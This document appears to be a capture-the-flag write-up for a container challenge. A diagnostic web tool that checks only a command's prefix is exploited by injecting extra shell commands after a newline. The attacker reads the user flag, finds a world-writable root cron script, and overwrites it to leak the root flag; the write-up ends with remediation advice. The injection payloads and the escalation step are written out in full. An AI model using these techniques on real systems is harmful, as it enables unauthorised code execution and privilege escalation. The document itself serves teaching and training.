# KPMG CTF 2026: Healthy Hijack - 1 — Privilege Escalation Writeup

## Challenge Information

| Field | Details |
| :--- | :--- |
| **Challenge Name** | Healthy Hijack - 1 |
| **Category** | Command Injection / Container Privilege Escalation |
| **Target Host** | `kicyber-2d9b83365b70-healthyhijack-0-0.chals.io` |
| **User Flag** | `KPMG_CTF{9Uqut2wozejIRzFJkQKdnwydb7jOVDC51SvrAk-7T0I}` |

---

## 1. Challenge Overview

The application exposes a web-based network diagnostic interface that claims to restrict execution to standard diagnostic utilities (`ping`, `traceroute`, `nslookup`).

The objective is to escape the restricted network-command runner, enumerate the container, retrieve the user flag, and identify privilege escalation opportunities from `appuser` to `root`.

---

## 2. Vulnerability Analysis

Inspecting the application logic reveals how commands are validated:

```python
ALLOWED_COMMANDS = ["ping", "traceroute", "nslookup"]

def is_allowed(cmd):
    return any(cmd.startswith(c) for c in ALLOWED_COMMANDS)
```

The command is then passed to a subshell:

```python
result = subprocess.run(
    cmd,
    shell=True,
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT,
    timeout=10
)
```

### The Flaws:
1. **Incomplete Allowlisting:** The validator only checks `cmd.startswith(...)`, ensuring the beginning matches an allowed command prefix, but does not sanitize the remainder.
2. **Missing Newline Sanitization:** While a blacklist filters characters such as `;`, `&`, `|`, backticks, `$(`, and `<`, it omits newline (`\n`) characters.
3. **Execution with `shell=True`:** Passing newlines to `/bin/sh` allows commands to be separated across multiple lines, causing each line to be evaluated as an independent shell command.

---

## 3. Step-by-Step Exploitation

### Step 1: Command Injection via Newline
Submitting the following payload starts with `nslookup` (passing `is_allowed`) and injects `id` on the subsequent line:

```text
nslookup localhost
id
```

**Output:**
```text
uid=1000(appuser) gid=1000(appuser) groups=1000(appuser)
```

This confirms code execution within the container under the context of `appuser`.

---

### Step 2: Retrieving the User Flag
Listing `/home/appuser`:

```text
nslookup localhost
ls -la /home/appuser
```

Found `user.txt`. Reading it:

```text
nslookup localhost
cat /home/appuser/user.txt
```

**User Flag:**
```text
KPMG_CTF{9Uqut2wozejIRzFJkQKdnwydb7jOVDC51SvrAk-7T0I}
```

---

### Step 3: Privilege Escalation Enumeration
Searching for writable files across the root filesystem:

```text
nslookup localhost
find /etc /opt /var /usr/local -xdev -type f -writable -ls
```

**Result:**
```text
-rwxrwxrwx 1 root root ... /opt/healthcheck.sh
```

`/opt/healthcheck.sh` is owned by `root`, scheduled to run periodically, but permissions are set to world-writable (`777`).

The script contents were:
```bash
#!/bin/sh
# System healthcheck
echo "OK" > /tmp/health.log
```

---

### Step 4: Overwriting the Healthcheck Script
Injecting a payload to overwrite the healthcheck script:

```text
nslookup localhost
echo 'cat /root/root.txt > /tmp/rootflag' > /opt/healthcheck.sh
```

When the scheduled task executes as root, `/tmp/rootflag` is populated with the contents of the root flag.

---

## 4. Final Flag (User)

```text
KPMG_CTF{9Uqut2wozejIRzFJkQKdnwydb7jOVDC51SvrAk-7T0I}
```

---

## 5. Remediation
1. **Never use `shell=True` with unvalidated user input:** Pass arguments as an array (`["nslookup", host]`) with `shell=False`.
2. **Proper Input Parsing:** Disallow all whitespace control characters, especially newlines.
3. **File Permission Hardening:** Secure system scripts against unauthorized modification (`chmod 755 /opt/healthcheck.sh`).
